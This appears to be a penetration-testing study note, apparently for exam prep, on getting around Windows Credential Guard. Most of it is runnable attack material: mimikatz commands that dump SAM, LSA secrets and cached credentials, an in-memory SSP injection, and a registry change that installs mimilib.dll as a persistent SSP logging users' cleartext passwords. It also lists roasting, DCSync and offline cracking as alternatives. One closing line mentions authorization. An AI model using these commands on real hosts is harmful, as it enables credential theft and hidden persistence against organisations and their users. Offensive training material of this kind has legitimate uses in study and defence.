title: Credential Guard — When sekurlsa::logonpasswords Returns Encrypted Junk
body:
You have admin on a host, you run mimikatz `sekurlsa::logonpasswords`, and instead of NTLM hashes you get blocks labeled 'LSA Isolated Data: LsaIsoPassword' with KdfContext / Tag / AuthData / Encrypted fields. That is Credential Guard. The credentials are real but you cannot read them — they live in an isolated memory space mimikatz cannot reach.

HOW IT WORKS (VTL0 vs VTL1):
Windows uses Virtualization-Based Security to split memory into trust levels.
  - VTL0 (normal world): where lsass.exe runs. This is where mimikatz operates.
  - VTL1 (secure world): where LSAISO.exe (Local Security Authority Isolated, also called 'Isolated LSA') runs, protected by the hypervisor.
With Credential Guard ON, secrets (NTLM hashes, Kerberos keys) move into LSAISO in VTL1. lsass in VTL0 only holds encrypted blobs it cannot decrypt itself — it asks LSAISO to do crypto operations on its behalf. Since mimikatz runs in VTL0 and the hypervisor enforces the VTL0/VTL1 boundary, dumping lsass memory yields only the encrypted 'LsaIsoPassword' blobs you see. Even SYSTEM in VTL0 cannot cross into VTL1.

WHAT CREDENTIAL GUARD DOES *NOT* STOP:
  - It does not protect local SAM account hashes (only domain creds in lsass)
  - It does not stop you capturing NEW credentials as users authenticate (this is the bypass)
  - It does not protect the machine account hash in some configs
  - It does nothing against kerberoast/AS-REP roast (those happen at the DC, not on this host)

THE BYPASS — register your own SSP:
LSASS routes every authentication through a Security Support Provider (Kerberos SSP, NTLM SSP, etc). You can register mimilib.dll as an ADDITIONAL SSP. When a user authenticates AFTER you've registered it, mimilib intercepts the plaintext on its way through lsass — BEFORE it gets locked away in VTL1 — and logs it to disk in cleartext. Credential Guard protects credentials at rest in memory; it cannot protect a credential in transit through an SSP you control. You are not breaking the VTL boundary, you are catching creds before they reach it. Full registration steps and the misc::memssp runtime variant are in the SSP injection node.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — DETECT CREDENTIAL GUARD
# ══════════════════════════════════════════════════
# The clearest signal: sekurlsa::logonpasswords shows
#   * Password :
#     * LSA Isolated Data: LsaIsoPassword
#       KdfContext: ...
#       Tag       : ...
#       Encrypted : ...
# instead of an NTLM hash. That IS Credential Guard.

# Confirm explicitly with Get-ComputerInfo:
Get-ComputerInfo | Select-Object DeviceGuard*

# The fields that matter:
#   DeviceGuardSecurityServicesConfigured : {CredentialGuard, ...}
#   DeviceGuardSecurityServicesRunning    : {CredentialGuard, ...}
# If 'CredentialGuard' appears under SecurityServicesRunning, it's ON.

# Quick one-liner version:
Get-ComputerInfo -Property DeviceGuardSecurityServicesRunning

# Via registry (no PowerShell):
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v LsaCfgFlags
# 1 = enabled with UEFI lock, 2 = enabled without lock, 0/absent = off

# ══════════════════════════════════════════════════
# STEP 2 — CONFIRM WHAT YOU CAN STILL GET
# ══════════════════════════════════════════════════
# Run logonpasswords anyway and read carefully. Even with CG on:
#  - Machine account ($) entries may still show NTLM in some configs
#  - Local accounts (SAM) are NOT protected by CG
#  - Any session WITHOUT the LsaIsoPassword wrapper is readable
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Dump local SAM (unaffected by Credential Guard):
mimikatz # lsadump::sam
# or
mimikatz # token::elevate
mimikatz # lsadump::secrets

# ══════════════════════════════════════════════════
# STEP 3 — THE SSP BYPASS (capture NEW logons)
# ══════════════════════════════════════════════════
# Runtime, no reboot — easiest on a lab:
mimikatz # privilege::debug
mimikatz # misc::memssp
#   Injected =)
# Now wait for a user to authenticate (lock/unlock, RDP, scheduled task).
# Cleartext lands in:
#   C:\Windows\System32\mimilsa.log
type C:\Windows\System32\mimilsa.log

# Persistent, survives reboot (registry SSP):
copy mimilib.dll C:\Windows\System32\
reg add 'hklm\system\currentcontrolset\control\lsa\' /v 'Security Packages' /d 'kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib' /t REG_MULTI_SZ /f
# After reboot, cleartext logs to:
#   C:\Windows\System32\kiwissp.log
# (Full registration + cleanup details in ssp_injection_persistence)

# ══════════════════════════════════════════════════
# STEP 4 — ALTERNATIVES WHEN YOU CAN'T WAIT FOR A LOGON
# ══════════════════════════════════════════════════
# Credential Guard is a host-memory protection. Go around it:
#
#  - Kerberoast / AS-REP roast at the DC (CG on a workstation is irrelevant)
#  - DCSync if you have the rights (reads NTDS, never touches this host's lsass)
#  - Dump the local SAM for local-admin reuse
#  - Pull cached domain creds from registry (lsadump::cache) and crack offline (-m 2100)
#  - Look for creds on disk: unattend.xml, scripts, config files, browser/credential manager
#  - cmdkey /list  +  runas /savecred  for stored credentials

# ══════════════════════════════════════════════════
# KEY POINT FOR THE EXAM
# ══════════════════════════════════════════════════
# Seeing 'LsaIsoPassword' is NOT a dead end. It tells you:
#   1. logonpasswords won't give hashes on THIS host's domain sessions
#   2. BUT the SSP bypass still captures fresh logons
#   3. AND roasting / DCSync / SAM / on-disk creds are all unaffected
# Don't tunnel-vision on dumping lsass. Pivot to a path CG doesn't cover.
warn: Credential Guard means the domain credentials in lsass memory are genuinely unreadable from VTL0 — do not waste exam time trying to force a dump. The SSP bypass only catches credentials of users who authenticate AFTER you register it, so it needs a fresh logon to produce anything. Registry SSP needs a reboot to take effect; misc::memssp does not but is lost on reboot. On real engagements, modifying LSA SSP config is loud and persistent — get authorization and clean up.

choices.label: Register SSP to capture logons — full steps
Roast at the DC instead (CG doesn't matter there)
